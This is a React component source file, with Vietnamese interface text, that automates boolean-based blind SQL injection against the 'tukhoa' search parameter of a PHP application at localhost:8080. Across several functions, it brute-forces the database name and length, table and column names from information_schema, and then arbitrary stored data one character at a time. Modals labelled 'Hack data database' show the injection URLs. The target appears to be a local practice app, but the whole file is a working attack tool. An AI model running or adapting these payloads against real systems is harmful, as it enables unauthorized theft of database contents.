import React, { Component } from 'react';
import CKEditor from "react-ckeditor-component";
import htmlToText from 'html-to-text';
var Crawler = require("crawler");

class CkeditPro extends Component {
    constructor(props) {
      
        super(props);
        this.updateContent = this.updateContent.bind(this);
        this.state = {
            content: '',
            lengthTableAndDatabase : 0,
            nhanlenhhackdata2 : 0,
            nhanlenhhackdata4 : 1,
            nhanlenhhackdata101 : 0,
            nhanlenhhackdata103 : 1,
            nhanlenhhackdata104 : 1,
            nhanlenhhackdata105 : '',
            nhanlenhhackdata106 : '',
        }
    }
   
    

   

    IsCHange2 = (event) => {
      const value = event.target.value;
      this.setState({
        nhanlenhhackdata2 : value
      });
      console.log(this.state.nhanlenhhackdata2);
    }
    IsCHange4 = (event) => {
      const value = event.target.value;
      this.setState({
        nhanlenhhackdata4 : value
      });
    }


    IsCHange10 = (event) => {
      const value = event.target.value;
      this.setState({
        nhanlenhhackdata101 : value
      });
    }
  
  

    IsCHange13 = (event) => {
      const value = event.target.value;
      this.setState({
        nhanlenhhackdata103 : value
      });
    }
    IsCHange14 = (event) => {
      const value = event.target.value;
      this.setState({
        nhanlenhhackdata104 : value
      });
    }
    IsCHange15 = (event) => {
      const value = event.target.value;
      this.setState({
        nhanlenhhackdata105 : value
      });
    }
    IsCHange16 = (event) => {
      const value = event.target.value;
      this.setState({
        nhanlenhhackdata106 : value
      });
    }







    // ck edit

    updateContent(newContent) {
        this.setState({
            content: newContent
        })
    }
    
    onChange = (evt) => {
      var newContent = evt.editor.getData();
      this.setState({
        content: newContent
      });
    }
    
    onBlur(evt){
      console.log("onBlur event called with event info: ", evt);
    }
    
    afterPaste(evt){
      console.log("afterPaste event called with event info: ", evt);
    }













    // cao data

    Button = () => {
            var c = new Crawler({
              preRequest: function(options, done) {
                  // 'options' here is not the 'options' you pass to 'c.queue', instead, it's the options that is going to be passed to 'request' module 
                  console.log(options);
              // when done is called, the request will start
              done();
              },
              callback: function(err, res, done) {
                  if(err) {
                  console.log(err)
              } else {
                  var $ = res.$;
                  let selfcall = $("th").text();
                  if(selfcall)
                  {
                    localStorage.setItem('dataxcode', res.body);
                    localStorage.setItem('dataxcode6', res.url);
                    localStorage.setItem('dataxcode4', res.statusCode);
                    localStorage.setItem('dataxcode5', res.options.method);
                  }
              }
              }
          });


          c.queue({
            uri: 'http://localhost:8080/MVC_FULL_FOR_PHP/',
            // this will override the 'preRequest' defined in crawler
            preRequest: function(options, done) {
                setTimeout(function() {
                console.log(options);
                done();
            }, 50)
            }
        }); 
        setTimeout(function () {
          this.setState({content: localStorage.getItem('dataxcode')});
        }.bind(this), 5000)
    
    }










    // length databse


    Button2 = () => {
               
        for (let i = 1; i <= 50; i++) {
          var c = new Crawler({
            preRequest: function(options, done) {
                // 'options' here is not the 'options' you pass to 'c.queue', instead, it's the options that is going to be passed to 'request' module 
                console.log(options);
            // when done is called, the request will start
            done();
            },
            callback: function(err, res, done) 
            {
                if(err) 
                {
                console.log(err)
                } 
                else 
                {
                  var $ = res.$;
                  let selfcall = $("th").text();
                  if(selfcall)
                  {
                     alert("đã tìm được độ dài của database " + i);
                     localStorage.setItem('dataxcode2',JSON.stringify(i));    
                  }
                }
               
            }
            
        });
        c.queue({
          uri: 'http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa=%27and+%28length%28database%28%29%29%29+%3D+'+i+'%23+&x=21&y=19&task=search',
          // this will override the 'preRequest' defined in crawler
          preRequest: function(options, done) {
              setTimeout(function() {
              console.log(options);
              done();
          }, 50)
          }
      }); 
      }
      
    
      


setTimeout(function () {
  this.setState({content: "cơ sở dữ liệu có độ dài "  +  localStorage.getItem('dataxcode2') , lengthTableAndDatabase : localStorage.getItem('dataxcode2')});
}.bind(this), 2000)
    
    
     
    }















// đoán tên cơ sở dữ liệu nha





        Button3 =  () => {
          let arrayABC = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"];
          let arraynewKyTu = [];
          for (let i = 0; i <= localStorage.getItem('dataxcode2'); i++) {
            (function(index) {
                setTimeout(function() {
                  for (let i = 0; i <= arrayABC.length; i++) {

                          setTimeout(function() { 
                            var c = new Crawler({
                              maxConnections : 10,
                              // This will be called for each crawled page
                              callback : function (error, res, done) {
                                  if(error){
                                      console.log(error);
                                  }else{
                                     
                                      // $ is Cheerio by default
                                      //a lean implementation of core jQuery designed specifically for the server
                                      var $ = res.$;
                                      let selfcall = $("th").text();
                                      if(selfcall)
                                      {
                                          arraynewKyTu.push(arrayABC[i]);
                                          
                                          localStorage.setItem('dataxcode3',JSON.stringify(arraynewKyTu));  
                                          
                                      }
                                  }
                                  done();
                              }
                          });
                          c.queue('http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa=%27and+substring%28database%28%29%2C'+index+'%2C1%29+%3D+%27'+arrayABC[i]+'%27%23&x=11&y=22&task=search');
          
                           }, 1000);
                        
                        }
                }, i * 1000);
            })(i);
        }
        setTimeout(function () {
          this.setState({content: " <h4>cơ sở dữ liệu có độ dài</h4> "  +  localStorage.getItem('dataxcode2') + "<h4>cơ sở dữ liệu có độ dài</h4> " + localStorage.getItem('dataxcode3')});
        }.bind(this), 20000)

        }





          kyThuChayNha = (number) => {
            if(number === "1")
            {
              this.nameTableBlindSqlInjection(this.state.nhanlenhhackdata2);
            }
            else
            {
              this.lengthTableBlindSqlInjection(this.state.nhanlenhhackdata2);
            }
          }































    //get name table
    nameTableBlindSqlInjection =  (number2) => {
      let arrayTable = [];
      for (let ix = 1; ix <= localStorage.getItem('dodai'); ix++) {
        (function(index) {
            setTimeout(function() {
              for (let i = 0; i <= 127; i++) {
                    setTimeout(function() { 
                      var c = new Crawler({
                        maxConnections : 10,
                        // This will be called for each crawled page
                        callback : function (error, res, done) {
                            if(error){
                                console.log(error);
                            }else{
                               
                                // $ is Cheerio by default
                                //a lean implementation of core jQuery designed specifically for the server
                                var $ = res.$;
                                let selfcall = $("th").text();
                                if(selfcall)
                                {
                                  arrayTable.push(String.fromCharCode(i));
                                  localStorage.setItem('tentable' , arrayTable);
                                }
                            }
                            done();
                        }
                    });
                    c.queue('http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa=%27AND+%28ascii%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+'+number2+'%2C1%29+%2C'+index+'%2C1%29%29%29+%3D+'+i+'%23&x=19&y=16&task=search');
                     }, 1000);
          
                  }
            }, ix * 1000);
          })(ix);
      }
      setTimeout(function () {
          this.setState({content: " <h4> cơ sở dữ liệu có độ dài </h4> "  +  localStorage.getItem('dataxcode2') + "<h4> cơ sở dữ liệu có độ dài </h4> " + localStorage.getItem('dataxcode3') + "<h4> Độ dài của table lần lượt là </h4> " + localStorage.getItem('dodai') + "<h4> Tên table  </h4>" + arrayTable});
        }.bind(this), 20000)
    }













    //get do dai name table
    lengthTableBlindSqlInjection = (number) => {
      for (let i = 1; i <= 100; i++) {
        var c = new Crawler({
          preRequest: function(options, done) {
              // 'options' here is not the 'options' you pass to 'c.queue', instead, it's the options that is going to be passed to 'request' module 
              console.log(options);
          // when done is called, the request will start
          done();
          },
          callback: function(err, res, done) 
          {
              if(err) 
              {
              console.log(err)
              } 
              else 
              {
                var $ = res.$;
                let selfcall = $("th").text();
                if(selfcall)
                {
                  let x = window.confirm("đã phát hiện được độ dài của bảng nha");
                  if(x)
                  {
                    
                    alert("Xác định được ở vị trí bảng " + number + " có độ dài " + i);
                    localStorage.setItem('dodai',JSON.stringify(i));  
                  }
                 
                }
          
      
              }
          }
          
      });
      c.queue({
        uri: 'http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa=%27AND+%28length%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+'+number+'%2C1%29%29%29+%3D'+i+'%23&x=20&y=16&task=search',
        // this will override the 'preRequest' defined in crawler
        preRequest: function(options, done) {
            setTimeout(function() {
            console.log(options);
            done();
        }, 50)
        }
    });
    }
    setTimeout(function () {
      this.setState({content: " <h4> cơ sở dữ liệu có độ dài </h4> "  +  localStorage.getItem('dataxcode2') + "<h4> cơ sở dữ liệu có độ dài </h4> " + localStorage.getItem('dataxcode3') + "<h4> Độ dài của table lần lượt là </h4> " + localStorage.getItem('dodai')});
    }.bind(this), 5000)
    }





















    bang2 =  ( number2) => {
      let orign = localStorage.getItem('tentable');
      let arrayTable = []; 
      for (let ix = 1; ix <= localStorage.getItem('dodaicolumn'); ix++) {
        (function(index) {
            setTimeout(function() {
              for (let i = 0; i <= 127; i++) {
                setTimeout(function() { 
                  var c = new Crawler({
                    maxConnections : 10,
                    // This will be called for each crawled page
                    callback : function (error, res, done) {
                        if(error){
                            console.log(error);
                        }else{
                                     var $ = res.$;
                                      let selfcall = $("th").text();
                                      if(selfcall)
                                      {
                                        
                                        arrayTable.push(String.fromCharCode(i));
                                        localStorage.setItem('tencolumn' , arrayTable);
                                       
                                      }
                            
                        }
                        done();
                    }
                });
                c.queue('http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa=%27AND+%28ascii%28substr%28%28select+column_name+from+information_schema.columns+where+table_schema%3Ddatabase%28%29++and+table_name%3D%22'+orign.replace(/[, ]+/g,"").trim()+'%22+limit+'+number2+'%2C1%29%2C'+ix+'%2C1%29%29%29+%3D+'+i+'%23&x=0&y=0&task=search');
                 }, 1000);
      
              }
            }, ix * 1000);
          })(ix);
      }
           setTimeout(function () {
        this.setState({content: " <h4> cơ sở dữ liệu có độ dài </h4> "  +  localStorage.getItem('dataxcode2') + "<h4> cơ sở dữ liệu có độ dài </h4> " + localStorage.getItem('dataxcode3') + "<h4> Độ dài của table lần lượt là </h4> " + localStorage.getItem('dodai') + "<h4> Tên của cột vừa phân tích được </h4>" + arrayTable});
      }.bind(this), 20000)
    }































    bang3 =  (number1 , number2 , number3 , number4) => {
      for (let i = 0; i <= 127; i++) {
        var c = new Crawler({
          preRequest: function(options, done) {
              // 'options' here is not the 'options' you pass to 'c.queue', instead, it's the options that is going to be passed to 'request' module 
              console.log(options);
          // when done is called, the request will start
          done();
          },
          callback: function(err, res, done) 
          {
              if(err) 
              {
              console.log(err)
              } 
              else 
              {
                var $ = res.$;
                let selfcall = $("th").text();
                if(selfcall)
                {
                  let x = window.confirm("Đã phát hiện được ký tự đầu tiên rồi nha");
                  if(x)
                  {
                    alert("Xác định được ký tự ở vị trí " + number2 + " là " + String.fromCharCode(i));
                  }
                 
                }
                else
                {
                  console.log("Không có data");
                }
      
              }
          }
          
      });
      c.queue({
        uri: 'http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa=%27AND+%28ascii%28substr%28%28select+'+number1+'+from+'+number2+'+limit+'+number3+'%2C1%29+%2C'+number4+'%2C1%29%29%29++%3D+'+i+'%23&x=0&y=0&task=search',
        // this will override the 'preRequest' defined in crawler
        preRequest: function(options, done) {
            setTimeout(function() {
            console.log(options);
            done();
        }, 50)
        }
    });
   
      }

    }







    lengthTablet = (number) => {
      let orign = localStorage.getItem('tentable');
      for (let i = 0; i <= 100; i++) {
        var c = new Crawler({
          preRequest: function(options, done) {
              // 'options' here is not the 'options' you pass to 'c.queue', instead, it's the options that is going to be passed to 'request' module 
              console.log(options);
          // when done is called, the request will start
          done();
          },
          callback: function(err, res, done) 
          {
              if(err) 
              {
              console.log(err)
              } 
              else 
              {
                var $ = res.$;
                let selfcall = $("th").text();
                if(selfcall)
                {

                  alert("Xác định được độ dài của column " + number + " là " + i);
                  localStorage.setItem('dodaicolumn' , i);
                 
                }
              }
          }
          
      });
      c.queue({
        uri: 'http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa=%27AND+%28length%28%28select+column_name+from+information_schema.columns+where+table_schema%3Ddatabase%28%29+and+table_name%3D%22'+orign.replace(/[, ]+/g,"").trim()+'%22+limit+'+number+'%2C1%29%29%29+%3D'+i+'%23&x=18&y=18&task=search#',
        // this will override the 'preRequest' defined in crawler
        preRequest: function(options, done) {
            setTimeout(function() {
            console.log(options);
            done();
        }, 50)
        }
    });
      }
      setTimeout(function () {
        this.setState({content: " <h4> cơ sở dữ liệu có độ dài </h4> "  +  localStorage.getItem('dataxcode2') + "<h4> cơ sở dữ liệu có độ dài </h4> " + localStorage.getItem('dataxcode3') + "<h4> Độ dài của table lần lượt là </h4> " + localStorage.getItem('dodai') + "<h1>Độ dài của column </h1>" + localStorage.getItem('dodaicolumn')});
      }.bind(this), 5000)
    }











    render() { 

    htmlToText.fromString(this.state.content);
        return (
              <div>
                 
                    <CKEditor 
                        
                        activeClass="p10" 
                        content={this.state.content} 
                        events={{
                            "blur": this.onBlur,
                            "afterPaste": this.afterPaste,
                            "change": this.onChange
                                }}
                    />

                    <div>
                  
                    <div className="row">
                      <div className="col-sm-12 ">
                      <div className="btn-group" role="group" aria-label="Basic example">
                      <button type="button" onClick={() => this.Button()} className="btn btn-success shadow-lg">crawler data</button>
                   
                              {/* Button trigger modal */}
                              <button type="button" className="btn btn-primary" data-toggle="modal" data-target="#exampleModal">
                                show code
                              </button>
                              

                              
                                {/* Modal */}
                                <div className="modal fade" id="exampleModal" tabIndex={-1} role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                                  <div className="modal-dialog" role="document">
                                    <div className="modal-content">
                                      <div className="modal-header">
                                        <h5 className="modal-title" id="exampleModalLabel">Code HTML5 preview</h5>
                                        <button type="button" className="close" data-dismiss="modal" aria-label="Close">
                                          <span aria-hidden="true">×</span>
                                        </button>
                                      </div>
                                      <div className="modal-body">
                                        <pre>{localStorage.getItem('dataxcode')}</pre>
                                      </div>
                                      <div className="modal-footer">
                                        <button type="button" className="btn btn-secondary" data-dismiss="modal">Close</button>
                                        <button type="button" className="btn btn-primary">Save changes</button>
                                       
                                      </div>
                                    </div>
                                  </div>
                                </div>


                              
                                <button type="button" className="btn btn-secondary"  data-toggle="modal" data-target="#exampleModal2">InjectionSQL database</button>

                             
                              
                             

                               {/* Modal */}
                                <div className="modal fade" id="exampleModal2" tabIndex={-1} role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                                  <div className="modal-dialog" role="document">
                                    <div className="modal-content">
                                      <div className="modal-header">
                                        <h5 className="modal-title" id="exampleModalLabel">injectionSQL hacking database</h5>
                                        <button type="button" className="close" data-dismiss="modal" aria-label="Close">
                                          <span aria-hidden="true">×</span>
                                        </button>
                                      </div>
                                      <div className="modal-body">
                                       
                                        <div className="alert alert-primary" role="alert">
                                            <code>
                                                Câu lệnh SQL injection lấy độ dài database
                                            </code>
                                           <div className="form-group">
                                            <label htmlFor="exampleFormControlTextarea1">SQL INJECTION</label>
                                            <textarea className="form-control" id="exampleFormControlTextarea1" rows={3} defaultValue={''} value={`http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa='and(length(database()))=${localStorage.getItem('dataxcode2')}--+task=search`} />
                                          </div>

                                          </div>

                                          <div className="alert alert-secondary" role="alert">
                                            <code>
                                                Câu lệnh SQL injection lấy tên database
                                            </code>
                                            <div className="form-group">
                                            <label htmlFor="exampleFormControlTextarea1">SQL INJECTION</label>
                                            <textarea className="form-control" id="exampleFormControlTextarea1" rows={3} defaultValue={''} value={`http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa='and substring(database(),1,1) = ${localStorage.getItem('dataxcode3')}--+task=search`} />
                                          </div>
                                          </div>
                                         

                                       

                                      </div>
                                      <div className="modal-footer">
                                        <button type="button" className="btn btn-secondary" data-dismiss="modal">Close</button>
                                        <div className="btn-group" role="group" aria-label="Basic example">
                                        <button type="button" className="btn btn-primary" onClick={() => this.Button2()}>Execute length</button>
                                        <button type="button" className="btn btn-warning" onClick={() => this.Button3()}>Execute name</button>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>




                                <button type="button" className="btn btn-warning" data-toggle="modal" data-target="#exampleModal3">InjectionSQL table</button>
                                  {/* Modal */}
                                  <div className="modal fade" id="exampleModal3" tabIndex={-1} role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                                  <div className="modal-dialog" role="document">
                                    <div className="modal-content">
                                      <div className="modal-header">
                                        <h5 className="modal-title" id="exampleModalLabel">Hack table database</h5>
                                        <button type="button" className="close" data-dismiss="modal" aria-label="Close">
                                          <span aria-hidden="true">×</span>
                                        </button>
                                      </div>
                                      <div className="modal-body">
                                        <div className="input-group mb-2">
                                          <div className="input-group-prepend">
                                            <span className="input-group-text" id="basic-addon1">Tìm bảng</span>
                                          </div>
                                          <input onChange={(event)=>this.IsCHange2(event)} type="number" min="0"  className="form-control"  aria-label="Username" aria-describedby="basic-addon1" />
                                        </div>


                                          <div className="alert alert-primary" role="alert">
                                              <code>
                                                  Hãy lựa vào câu lệnh truy vấn trên để hack được độ dài của table 
                                              </code>
                                              <div className="form-group">
                                            <label htmlFor="exampleFormControlTextarea1">SQL INJECTION</label>
                                            <textarea className="form-control" id="exampleFormControlTextarea1" rows={3} defaultValue={''} value={`http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa='AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = ${localStorage.getItem('dodai')}--+`} />
                                          </div>
                                          </div>

                                          <div className="alert alert-primary" role="alert">
                                              <code>
                                                  Hãy lựa vào câu lệnh truy vấn trên để hiển thị tên table ở vị trí đó
                                              </code>
                                              <div className="form-group">
                                            <label htmlFor="exampleFormControlTextarea1">SQL INJECTION</label>
                                            <textarea className="form-control" id="exampleFormControlTextarea1" rows={3} defaultValue={''} value={`http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa='AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) =  ${localStorage.getItem('tentable')}--+`} />
                                          </div>
                                          </div>

                                        <div className="form-group">
                                          <label className="exampleFormControlSelect2" htmlFor="exampleFormControlSelect2">chọn theo cách của bạn </label>
                                          <select multiple className="form-control" onChange={(event)=>this.IsCHange4(event)}  id="exampleFormControlSelect2">
                                            <option value={1}>Get char table in database</option>
                                            <option value={2}>Get length table in database</option>
            
                                          </select>
                                        </div>
                                      </div>
                                      <div className="modal-footer">
                                        <button type="button" className="btn btn-secondary"  data-dismiss="modal">Close</button>
                                        <button type="button" className="btn btn-primary" onClick={()=>this.kyThuChayNha(this.state.nhanlenhhackdata4)}>Execute</button>
                                      </div>
                                    </div>
                                  </div>
                                </div>





                                
                                <button type="button" className="btn btn-success" data-toggle="modal" data-target="#exampleModal4">InjectionSQL columns</button>
                                  {/* Modal */}
                                  <div className="modal fade" id="exampleModal4" tabIndex={-1} role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                                  <div className="modal-dialog" role="document">
                                    <div className="modal-content">
                                      <div className="modal-header">
                                        <h5 className="modal-title" id="exampleModalLabel">Hack columns table</h5>
                                        <button type="button" className="close" data-dismiss="modal" aria-label="Close">
                                          <span aria-hidden="true">×</span>
                                        </button>
                                      </div>
                                      <div className="modal-body">
                                      

                                        <div className="alert alert-primary" role="alert">
                                              <code>
                                                 độ dài của tên cột được thực hiện theo câu lệnh dưới
                                              </code>
                                              <div className="form-group">
                                            <label htmlFor="exampleFormControlTextarea1">SQL INJECTION</label>
                                            <textarea className="form-control" id="exampleFormControlTextarea1" rows={3} defaultValue={''} value={`http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa='AND (length((select column_name from information_schema.columns where table_schema=database() and table_name="banhang" limit 0,1))) = ${localStorage.getItem('dodaicolumn')} --+`} />
                                          </div>
                                          </div>



                                          <div className="alert alert-primary" role="alert">
                                              <code>
                                                 Tên chuỗi được giải theo câu lệnh mô phỏng ở dưới
                                              </code>
                                              <div className="form-group">
                                            <label htmlFor="exampleFormControlTextarea1">SQL INJECTION</label>
                                            <textarea className="form-control" id="exampleFormControlTextarea1" rows={3} defaultValue={''} value={`http://localhost:8080/MVC_FULL_FOR_PHP/?tukhoa='AND (ascii(substr((select column_name from information_schema.columns where table_schema=database()  and table_name="banhang" limit 0,1),1,1))) = ${localStorage.getItem('tencolumn')} --+`} />
                                          </div>
                                          </div>

                                        <div className="input-group mb-2">
                                          <div className="input-group-prepend">
                                            <span className="input-group-text" id="basic-addon1">column</span>
                                          </div>
                                          <input onChange={(event)=>this.IsCHange10(event)} type="number" min="0"  className="form-control"  aria-label="Username" aria-describedby="basic-addon1" />
                                        </div>



                                      </div>
                                      <div className="modal-footer">
                                        <button type="button" className="btn btn-secondary"  data-dismiss="modal">Close</button>
                                        <div className="btn-group" role="group" aria-label="Basic example">
                                        <button type="button" className="btn btn-primary" onClick={()=>this.bang2(this.state.nhanlenhhackdata101)}>Execute column</button>
                                        <button type="button" className="btn btn-warning" onClick={()=>this.lengthTablet(this.state.nhanlenhhackdata101)}>length column</button>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>





                                <button type="button" className="btn btn-danger" data-toggle="modal" data-target="#exampleModal5">Hacking data</button>
                                  {/* Modal */}
                                  <div className="modal fade" id="exampleModal5" tabIndex={-1} role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                                  <div className="modal-dialog" role="document">
                                    <div className="modal-content">
                                      <div className="modal-header">
                                        <h5 className="modal-title" id="exampleModalLabel">Hack data database</h5>
                                        <button type="button" className="close" data-dismiss="modal" aria-label="Close">
                                          <span aria-hidden="true">×</span>
                                        </button>
                                      </div>
                                      <div className="modal-body">
                                        <div className="input-group mb-2">
                                          <div className="input-group-prepend">
                                            <span className="input-group-text" id="basic-addon1">Nhập tên cột</span>
                                          </div>
                                          <input onChange={(event)=>this.IsCHange13(event)} type="text"  className="form-control"  aria-label="Username" aria-describedby="basic-addon1" />
                                        </div>
                                        <div className="input-group mb-2">
                                          <div className="input-group-prepend">
                                            <span className="input-group-text" id="basic-addon1">Nhập tên bảng</span>
                                          </div>
                                          <input onChange={(event)=>this.IsCHange14(event)} type="text"  className="form-control"  aria-label="Username" aria-describedby="basic-addon1" />
                                        </div>


                                        <div className="alert alert-primary" role="alert">
                                              <code>
                                                 vị trí bắt đầu từ 0
                                              </code>
                                          </div>



                                        <div className="input-group mb-2">
                                          <div className="input-group-prepend">
                                            <span className="input-group-text" id="basic-addon1">Data</span>
                                          </div>
                                          <input onChange={(event)=>this.IsCHange15(event)} type="number" min="0"  className="form-control"  aria-label="Username" aria-describedby="basic-addon1" />
                                        </div>

                                       

                                        <div className="input-group mb-2">
                                          <div className="input-group-prepend">
                                            <span className="input-group-text" id="basic-addon1">Vị trí ký tự data</span>
                                          </div>
                                          <input onChange={(event)=>this.IsCHange16(event)} type="number" min="1"  className="form-control"  aria-label="Username" aria-describedby="basic-addon1" />
                                        </div>


                                        
                                      </div>
                                      <div className="modal-footer">
                                        <button type="button" className="btn btn-secondary"  data-dismiss="modal">Close</button>
                                        <button type="button" className="btn btn-primary" onClick={()=>this.bang3(this.state.nhanlenhhackdata103 , this.state.nhanlenhhackdata104 , this.state.nhanlenhhackdata105 , this.state.nhanlenhhackdata106)}>Execute</button>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                               


                      </div>
                      </div>
                    </div>
                  </div>
              </div>
             
           
        );
    }
}
 
export default CkeditPro;